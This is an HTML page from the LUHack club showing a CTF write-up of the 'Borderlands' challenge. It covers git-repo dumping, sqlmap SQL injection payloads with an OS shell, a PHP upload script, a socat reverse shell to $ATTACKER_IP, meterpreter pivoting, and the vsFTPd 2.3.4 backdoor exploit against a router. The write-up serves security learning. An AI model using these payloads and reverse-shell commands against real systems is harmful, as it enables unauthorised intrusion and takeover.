@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<meta content="KxBie6T6uw1Iexm0-tldr4zEIM4zAUdDLF9N_t97cIE" name="google-site-verification"/>
+<meta content="CTF writeups made by LUHack members." name="description">
+<meta content="Borderlands" property="og:title"/>
+<meta content="website" property="og:type"/>
+<meta content="../../static/images/logo_small.png" property="og:image"/>
+<meta content="" property="og:url"/>
+<meta content="LUHack" property="og:site_name"/>
+<meta content="CTF writeups made by LUHack members." property="og:description"/>
+<link href="../../static/images/apple-touch-icon-57x57.png" rel="apple-touch-icon-precomposed" sizes="57x57"/>
+<link href="../../static/images/apple-touch-icon-114x114.png" rel="apple-touch-icon-precomposed" sizes="114x114">
+<link href="../../static/images/apple-touch-icon-72x72.png" rel="apple-touch-icon-precomposed" sizes="72x72"/>
+<link href="../../static/images/apple-touch-icon-144x144.png" rel="apple-touch-icon-precomposed" sizes="144x144"/>
+<link href="../../static/images/apple-touch-icon-60x60.png" rel="apple-touch-icon-precomposed" sizes="60x60"/>
+<link href="../../static/images/apple-touch-icon-120x120.png" rel="apple-touch-icon-precomposed" sizes="120x120"/>
+<link href="../../static/images/apple-touch-icon-76x76.png" rel="apple-touch-icon-precomposed" sizes="76x76"/>
+<link href="../../static/images/apple-touch-icon-152x152.png" rel="apple-touch-icon-precomposed" sizes="152x152"/>
+<link href="../../static/images/favicon-196x196.png" rel="icon" sizes="196x196" type="image/png"/>
+<link href="../../static/images/favicon-96x96.png" rel="icon" sizes="96x96" type="image/png"/>
+<link href="../../static/images/favicon-32x32.png" rel="icon" sizes="32x32" type="image/png"/>
+<link href="../../static/images/favicon-16x16.png" rel="icon" sizes="16x16" type="image/png"/>
+<link href="../../static/images/favicon-128.png" rel="icon" sizes="128x128" type="image/png"/>
+<meta content="LUHack" name="application-name"/>
+<meta content="#FFFFFF" name="msapplication-TileColor"/>
+<meta content="../../static/images/mstile-144x144.png" name="msapplication-TileImage"/>
+<meta content="../../static/images/mstile-70x70.png" name="msapplication-square70x70logo"/>
+<meta content="../../static/images/mstile-150x150.png" name="msapplication-square150x150logo"/>
+<meta content="../../static/images/mstile-310x150.png" name="msapplication-wide310x150logo"/>
+<meta content="../../static/images/mstile-310x310.png" name="msapplication-square310x310logo"/>
+<script type="application/ld+json">
+     {
+         "@context": "https://schema.org",
+         "@type": "Article",
+         "author": "simmsb",
+         "name": "Borderlands",
+         "about": "Cyber Security",
+         "url": "",
+         "datePublished": "2019-10-29T18:25:59.726196",
+         "dateModified": "2019-10-29T18:25:59.726196",
+         "publsher": {
+             "@type": "Organization",
+             "name": "LUHack"
+         }
+     }
+    </script>
+<title>LUHack Writeup: Borderlands</title>
+<link href="../../_assets/cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/fontawesome.min.css" referrerpolicy="no-referrer" rel="stylesheet"/>
+<link href="../../_assets/cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/solid.min.css" referrerpolicy="no-referrer" rel="stylesheet"/>
+<link href="../../_assets/cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/brands.min.css" referrerpolicy="no-referrer" rel="stylesheet"/>
+<link href="../../_assets/unpkg.com/purecss%402.0.3/build/pure-min.css" rel="stylesheet"/>
+<link href="../../_assets/fonts.googleapis.com/css_81f601ca.css" rel="stylesheet"/>
+<link href="../../static/css/main.css" rel="stylesheet"/>
+<link href="../../static/css/highlight.min.css" rel="stylesheet"/>
+<script defer="" src="../../static/js/base.js"></script>
+</link></meta></head>
+<body>
+<div class="with-sidebar">
+<div class="fill-height">
+<div class="sidebar" id="menu">
+<div class="header">
+<h1 class="brand-title">
+<a class="logo" href="../../index.html">
+<img alt="LUHack logo" src="../../static/images/luhack_logo.png" width="100%"/>
+</a>
+</h1>
+<nav class="nav">
+<ul class="nav-list">
+<li class="nav-item">
+<a class="button" href="../../index.html">Home</a>
+</li>
+<li class="nav-item">
+<a class="button" href="../index.html">Writeups</a>
+</li>
+<li class="nav-item">
+<a class="button" href="../../challenges/index.html">Challenges</a>
+</li>
+<br/>
+<li class="nav-item">
+<a class="button" href="../tags.html">Tag List</a>
+</li>
+<li class="nav-item">
+<a class="button" href="../new.html">New Writeup</a>
+</li>
+</ul>
+</nav>
+<br/>
+<form action="../index.html" class="pure-form" method="GET">
+<input autocomplete="off" class="search-bar" id="search-bar" name="search" placeholder="Search writeups" type="search" value=""/>
+</form>
+<div class="header-content">
+<div class="article-meta">
+<h2>Borderlands</h2>
+<h4 class="author">By: <a href="../user/simmsb.html">simmsb</a></h4>
+<h4 class="date">2019-10-29 18:25:59.726196</h4>
+<div class="tags">
+<a class="post-category" href="../tag/pivoting.html">pivoting</a>
+<a class="post-category" href="../tag/sqli.html">sqli</a>
+<a class="post-category" href="../tag/hackback2.html">hackback2</a>
+</div>
+</div>
+</div>
+</div>
+<div class="footer">
+<div class="legal">
+<div class="">
+<a href="#" title="Sign In">Sign In</a>
+</div>
+</div>
+</div>
+</div>
+<div class="not-sidebar">
+<main>
+<h1>Borderlands</h1>
+<p>For borderlands we are given the IP of a web application running inside a
+network named <code>network 1</code>.</p>
+<h2>Exposed GIT repo</h2>
+<p>Upon running an application scan with <code>nmap -A</code> we observe that there is an
+exposed git repository:</p>
+<pre><code>80/tcp   open   http       nginx 1.14.0 (Ubuntu)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-git: 
+|   $VICTIM_IP:80/.git/
+|     Git repository found!
+|     .git/config matched patterns 'user'
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|_    Last commit message: added mobile apk for beta testing. 
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: Context Information Security - HackBack 2
+</code></pre>
+<p>We can use <a href="https://github.com/arthaud/git-dumper">git-dumper</a> to dump this
+repo:</p>
+<pre><code>root@kali:/mnt/hgfs/stuff# python3 ./git-dumper/git-dumper.py http://$VICTIM_IP/ dump_borderlands
+[-] Testing http://$VICTIM_IP/.git/HEAD [200]
+[-] Testing http://$VICTIM_IP/.git/ [403]
+[-] Fetching common files
+...
+[-] Fetching http://$VICTIM_IP/.git/objects/e0/03b9156c54897414bc5958372b10d76fed64bb [200]
+[-] Running git checkout .
+</code></pre>
+<p>Now we can see the source of the website:</p>
+<pre><code>root@kali# tree
+.
+├── api.php
+├── Context_Red_Teaming_Guide.pdf
+├── Context_White_Paper_Pen_Test_101.pdf
+├── CTX_WSUSpect_White_Paper.pdf
+├── Demystifying_the_Exploit_Kit_-_Context_White_Paper.pdf
+├── functions.php
+├── Glibc_Adventures-The_Forgotten_Chunks.pdf
+├── home.php
+├── index.php
+└── info.php
+
+0 directories, 10 files
+</code></pre>
+<p>Inside <code>home.php</code> we find the first flag:</p>
+<div class="highlight"><pre><span></span><span class="x">echo ("&lt;ul&gt;");</span>
+<span class="x">while ($stmt -&gt; fetch()) {</span>
+<span class="x">    echo ('&lt;li&gt;&lt;a href="api.php?documentid='.$documentid.'&amp;amp;apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD"&gt;'.$document_name.'&lt;/a&gt;&lt;/li&gt;');</span>
+<span class="x">    $resultsArray[] = array("documentid" =&gt; $documentid, "documentname" =&gt; $document_name, "location" =&gt; $location);</span>
+<span class="x">}</span>
+</pre></div>
+<p>Inside the git log there is a commit with the message:</p>
+<pre><code>commit b2f776a52fe81a731c6c0fa896e7f9548aafceab
+Author: Context Information Security &lt;recruitment@contextis.com&gt;
+Date:   Tue Sep 10 14:41:00 2019 +0100
+
+    removed sensitive data
+</code></pre>
+<p>We can use <code>git diff</code> to show us the changes in that commit:</p>
+<div class="highlight"><pre><span></span><span class="w">root@kali# git diff b2f776^!</span>
+<span class="gh">diff --git a/api.php b/api.php</span><span class="w"></span>
+<span class="gh">index 2229eb4..ebd0822 100644</span><span class="w"></span>
+<span class="gd">--- a/api.php</span><span class="w"></span>
+<span class="gi">+++ b/api.php</span><span class="w"></span>
+<span class="gu">@@ -2,7 +2,7 @@</span><span class="w"></span>
+
+<span class="w"> </span>require_once("functions.php");<span class="w"></span>
+
+<span class="gd">-if (!isset($_GET['apikey']) || ((substr($_GET['apikey'], 0, 20) !== "WEBLhvOJAH8d50Z4y5G5") &amp;&amp; substr($_GET['apikey'], 0, 20) !== "ANDVOWLDLAS5Q8OQZ2tu" &amp;&amp; substr($_GET['apikey'], 0, 20) !== "GITtFi80llzs4TxqMWtCotiTZpf0HC"))</span><span class="w"></span>
+<span class="gi">+if (!isset($_GET['apikey']) || ((substr($_GET['apikey'], 0, 20) !== "WEBLhvOJAH8d50Z4y5G5") &amp;&amp; substr($_GET['apikey'], 0, 20) !== "ANDVOWLDLAS5Q8OQZ2tu" &amp;&amp; substr($_GET['apikey'], 0, 20) !== "GITtFi80llzs4TxqMWtC"))</span><span class="w"></span>
+<span class="w"> </span>{<span class="w"></span>
+<span class="w"> </span>    die("Invalid API key");<span class="w"></span>
+<span class="w"> </span>}<span class="w"></span>
+</pre></div>
+<p>Which gives us another flag.</p>
+<h2>SQLi vuln</h2>
+<p>Now we want to try and get access to the server, the file <code>functions.php</code>
+contains a nice SQLi vulnerability:</p>
+<div class="highlight"><pre><span></span><span class="x">function GetDocumentDetails($conn, $documentid)</span>
+<span class="x">{</span>
+<span class="x">    $sql = "select documentid, documentname, location from documents where documentid=".$documentid;</span>
+<span class="x">    //echo $sql;</span>
+<span class="x">    $result = mysqli_query($conn, $sql) or die(mysqli_error($conn));</span>
+
+<span class="x">    if (mysqli_num_rows($result) === 1) {</span>
+<span class="x">        return mysqli_fetch_assoc($result);</span>
+<span class="x">    } else {</span>
+<span class="x">        return null;</span>
+<span class="x">    }</span>
+<span class="x">}</span>
+</pre></div>
+<p>This function is called by the file <code>api.php</code> with the parameters: <code>apikey</code> and
+<code>documentid</code>, to automate the process we throw SQLMap at it:</p>
+<div class="highlight"><pre><span></span>root@kali# sqlmap -u <span class="se">\</span>
+    <span class="s2">"http://</span><span class="nv">$VICTIM_IP</span><span class="s2">/api.php?apikey=WEBLhvOJAH8d50Z4y5G5&amp;documentid=aa"</span> -p <span class="se">\</span>
+    <span class="s2">"documentid"</span>
+
+sqlmap identified the following injection point<span class="o">(</span>s<span class="o">)</span> with a total of <span class="m">1602</span> HTTP<span class="o">(</span>s<span class="o">)</span> requests:
+---
+Parameter: documentid <span class="o">(</span>GET<span class="o">)</span>
+    Type: error-based
+    Title: MySQL &gt;<span class="o">=</span> <span class="m">5</span>.0 error-based - Parameter replace <span class="o">(</span>FLOOR<span class="o">)</span>
+    Payload: <span class="nv">apikey</span><span class="o">=</span>WEBLhvOJAH8d50Z4y5G5<span class="p">&amp;</span><span class="nv">documentid</span><span class="o">=(</span>SELECT <span class="m">5484</span> FROM<span class="o">(</span>SELECT COUNT<span class="o">(</span>*<span class="o">)</span>,CONCAT<span class="o">(</span>0x716a717671,<span class="o">(</span>SELECT <span class="o">(</span>ELT<span class="o">(</span><span class="nv">5484</span><span class="o">=</span><span class="m">5484</span>,1<span class="o">)))</span>,0x717a717a71,FLOOR<span class="o">(</span>RAND<span class="o">(</span><span class="m">0</span><span class="o">)</span>*2<span class="o">))</span>x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x<span class="o">)</span>a<span class="o">)</span>
+
+    Type: time-based blind
+    Title: MySQL &gt;<span class="o">=</span> <span class="m">5</span>.0.12 time-based blind - Parameter replace
+    Payload: <span class="nv">apikey</span><span class="o">=</span>WEBLhvOJAH8d50Z4y5G5<span class="p">&amp;</span><span class="nv">documentid</span><span class="o">=(</span>CASE WHEN <span class="o">(</span><span class="nv">7665</span><span class="o">=</span><span class="m">7665</span><span class="o">)</span> THEN SLEEP<span class="o">(</span><span class="m">5</span><span class="o">)</span> ELSE <span class="m">7665</span> END<span class="o">)</span>
+
+    Type: UNION query
+    Title: MySQL UNION query <span class="o">(</span>random number<span class="o">)</span> - <span class="m">3</span> columns
+    Payload: <span class="nv">apikey</span><span class="o">=</span>WEBLhvOJAH8d50Z4y5G5<span class="p">&amp;</span><span class="nv">documentid</span><span class="o">=</span>-1061 UNION ALL SELECT <span class="m">2259</span>,CONCAT<span class="o">(</span>0x716a717671,0x6b4876446e627951464b74686c656c6d6c4e454e7576464d444757636b446457417a776e7a58434b,0x717a717a71<span class="o">)</span>,2259#
+---
+<span class="o">[</span><span class="m">14</span>:44:43<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx <span class="m">1</span>.14.0
+back-end DBMS: MySQL &gt;<span class="o">=</span> <span class="m">5</span>.0
+</pre></div>
+<p>SQLmap comes with a handy flag named <code>--os-shell</code> which we can use to get a
+shell on the system:</p>
+<div class="highlight"><pre><span></span>root@kali# sqlmap -u <span class="se">\</span>
+    <span class="s2">"http://</span><span class="nv">$VICTIM_IP</span><span class="s2">/api.php?apikey=WEBLhvOJAH8d50Z4y5G5&amp;documentid=aa"</span> -p <span class="se">\</span>
+    <span class="s2">"documentid"</span> <span class="se">\</span>
+    --os-shell
+
+os-shell&gt; 
+os-shell&gt; ls
+<span class="k">do</span> you want to retrieve the <span class="nb">command</span> standard output? <span class="o">[</span>Y/n/a<span class="o">]</span> a
+<span class="nb">command</span> standard output:
+---
+CTX_WSUSpect_White_Paper.pdf
+Context_Red_Teaming_Guide.pdf
+Context_White_Paper_Pen_Test_101.pdf
+Demystifying_the_Exploit_Kit_-_Context_White_Paper.pdf
+Glibc_Adventures-The_Forgotten_Chunks.pdf
+api.php
+functions.php
+home.php
+index.php
+info.php
+mobile-app-prototype.apk
+tmpbqnyz.php
+tmpuuqad.php
+---
+os-shell&gt;
+</pre></div>
+<p>We can then get 4th flag from <code>/var/www</code> with:</p>
+<pre><code>os-shell&gt; ls /var/www
+command standard output:
+---
+flag.txt
+html
+---
+os-shell&gt; cat /var/www/flag.txt
+command standard output: '{FLAG:Webapp:48a5f4bfef44c8e9b34b926051ad35a6}'
+</code></pre>
+<h2>Pivoting</h2>
+<p>Now we have a shell, but it's not very useful as it's not a complete TTY, so
+we're going to use <code>socat</code> to tunnel back to our system.</p>
+<p>The device the webapp is running on doesn't have <code>socat</code> so I'm choosing to
+upload a <a href="https://github.com/andrew-d/static-binaries/blob/530df977dd38ba3b4197878b34466d49fce69d8e/binaries/linux/x86_64/socat">statically linked binary</a>.</p>
+<p>I tried using the sqlmap flags <code>--file-write</code> and <code>--file-dest</code> to send the
+file, but it was too large, so instead I ~~wrote~~stole a PHP script to write an
+uploaded file:</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?PHP</span>
+  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'uploaded_file'</span><span class="p">]))</span>
+  <span class="p">{</span>
+    <span class="nv">$path</span> <span class="o">=</span> <span class="s2">"/var/www/html/"</span><span class="p">;</span>
+    <span class="nv">$path</span> <span class="o">=</span> <span class="nv">$path</span> <span class="o">.</span> <span class="nb">basename</span><span class="p">(</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'uploaded_file'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">]);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'uploaded_file'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">],</span> <span class="nv">$path</span><span class="p">))</span> <span class="p">{</span>
+      <span class="k">echo</span> <span class="s2">"The file "</span><span class="o">.</span>  <span class="nb">basename</span><span class="p">(</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'uploaded_file'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">])</span><span class="o">.</span> 
+      <span class="s2">" has been uploaded"</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span><span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">"There was an error uploading the file, please try again!"</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<p>This was then uploaded with:</p>
+<div class="highlight"><pre><span></span>root@kali# sqlmap -u <span class="se">\</span>
+    <span class="s2">"http://</span><span class="nv">$VICTIM_IP</span><span class="s2">/api.php?apikey=WEBLhvOJAH8d50Z4y5G5&amp;documentid=aa"</span> <span class="se">\</span>
+    --file-write<span class="o">=</span>upload.php <span class="se">\</span>
+    --file-dest<span class="o">=</span>/var/www/html/upload.php
+</pre></div>
+<p>Once done, we can upload our socat binary with:</p>
+<div class="highlight"><pre><span></span>root@kali# curl -X POST -F <span class="s2">"uploaded_file=@socat"</span> http://<span class="nv">$VICTIM_IP</span>/upload.php
+</pre></div>
+<p>Once we have this, start a msfconsole on the attacking machine:</p>
+<pre><code>msf5 &gt; use exploit/multi/handler
+msf5 exploit(multi/handler) &gt; set lhost $ATTACKER_IP
+lhost =&gt; $ATTACKER_IP
+msf5 exploit(multi/handler) &gt; set lport 4444
+lport =&gt; 4444
+msf5 exploit(multi/handler) &gt; set payload linux/x86/shell/reverse_tcp
+payload =&gt; linux/x86/shell/reverse_tcp
+msf5 exploit(multi/handler) &gt; run
+
+[*] Started reverse TCP handler on $ATTACKER_IP:4444 
+</code></pre>
+<p>And on the victim, through the shell we got through SQLMap:</p>
+<div class="highlight"><pre><span></span>os-shell&gt; ./socat exec:<span class="s1">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:<span class="nv">$ATTACKER_IP</span>:4444
+</pre></div>
+<p>On the attacker we should then see:</p>
+<pre><code>[*] Sending stage (36 bytes) to $VICTIM_IP
+[*] Command shell session 2 opened ($ATTACKER_IP:4444 -&gt; $VICTIM_IP:34694) at 2019-10-29 14:58:55 +0000
+
+www-data@app:~/html$ 
+</code></pre>
+<p>Then we background the session with <code>Ctrl + s</code> and run <code>sessions -u &lt;session number&gt;</code>,
+This will give us a meterpreter shell.</p>
+<p>If you're not already in the meterpreter shell, enter it with <code>sessions -i &lt;meterpreter shell number&gt;</code></p>
+<p>The shell number is probably one more than the initial session number.</p>
+<p>Once in the meterpreter shell, I upload static binaries of <code>nmap</code> and <code>ncat</code>
+from <a href="https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64">here</a>
+using the <code>upload</code> command.</p>
+<pre><code>meterpreter &gt; upload ncat
+[*] uploading  : ncat -&gt; ncat
+[*] Uploaded -1.00 B of 2.78 MiB (0.0%): ncat -&gt; ncat
+[*] uploaded   : ncat -&gt; ncat
+</code></pre>
+<p>Using the <code>shell</code> meterpreter command we get a command shell.</p>
+<p>The first thing is to nmap the router, after some playing around I figured out
+that we are able to refer to the devices on the network by their hostname, and
+so:</p>
+<div class="highlight"><pre><span></span>www-data@app:~/html$ ./nmap router1
+
+Starting Nmap <span class="m">6</span>.49BETA1 <span class="o">(</span> http://nmap.org <span class="o">)</span> at <span class="m">2019</span>-10-29 <span class="m">18</span>:17 UTC
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report <span class="k">for</span> router1 <span class="o">(</span><span class="m">172</span>.16.1.128<span class="o">)</span>
+Host is up <span class="o">(</span><span class="m">0</span>.00014s latency<span class="o">)</span>.
+rDNS record <span class="k">for</span> <span class="m">172</span>.16.1.128: hackback_router1_1.hackback_r_1_ext
+Not shown: <span class="m">1203</span> closed ports
+PORT     STATE SERVICE
+<span class="m">21</span>/tcp   open  ftp
+<span class="m">179</span>/tcp  open  bgp
+<span class="m">2601</span>/tcp open  zebra
+<span class="m">2605</span>/tcp open  bgpd
+
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned <span class="k">in</span> <span class="m">0</span>.05 seconds
+</pre></div>
+<p>Unfortunately because nmap is a static binary we can't run version detection
+scans, but luckily when we try to connect to the ftp server via <code>./ncat router1 21</code> we see:</p>
+<div class="highlight"><pre><span></span>www-data@app:~/html$ ./ncat router1 <span class="m">21</span>
+<span class="m">220</span> <span class="o">(</span>vsFTPd <span class="m">2</span>.3.4<span class="o">)</span>
+</pre></div>
+<p>Which just so happens to be a vulnerable version of vsFTPd.</p>
+<p>so we execute the exploit:</p>
+<div class="highlight"><pre><span></span>www-data@app:~/html$ ./ncat router1 <span class="m">21</span>
+<span class="m">220</span> <span class="o">(</span>vsFTPd <span class="m">2</span>.3.4<span class="o">)</span>
+USER user:<span class="o">)</span>
+<span class="m">331</span> Please specify the password.
+PASS pass
+
+^C
+
+www-data@app:~/html$ ./ncat router1 <span class="m">6200</span>
+
+ls
+bin
+dev
+etc
+home
+lib
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+supervisord.log
+supervisord.pid
+sys
+tmp
+usr
+var
+
+whoami
+root
+
+ls /root/
+flag.txt
+vsftpd
+
+cat /root/flag.txt
+<span class="o">{</span>FLAG:Router1:c877f00ce2b886446395150589166dcd<span class="o">}</span>
+
+ip route
+default via <span class="m">172</span>.16.12.1 dev eth0 
+<span class="m">172</span>.16.1.0/24 dev eth1 proto kernel scope link src <span class="m">172</span>.16.1.128 
+<span class="m">172</span>.16.2.0/24 via <span class="m">172</span>.16.12.102 dev eth0 proto zebra metric <span class="m">20</span> 
+<span class="m">172</span>.16.3.0/24 via <span class="m">172</span>.16.31.103 dev eth2 proto zebra metric <span class="m">20</span> 
+<span class="m">172</span>.16.12.0/24 dev eth0 proto kernel scope link src <span class="m">172</span>.16.12.101 
+<span class="m">172</span>.16.31.0/24 dev eth2 proto kernel scope link src <span class="m">172</span>.16.31.101
+</pre></div>
+<p>(That's all for today because I managed to lock up router1 and I'm tired)</p>
+</main>
+</div>
+</div>
+</div>
+</body>
+</html>
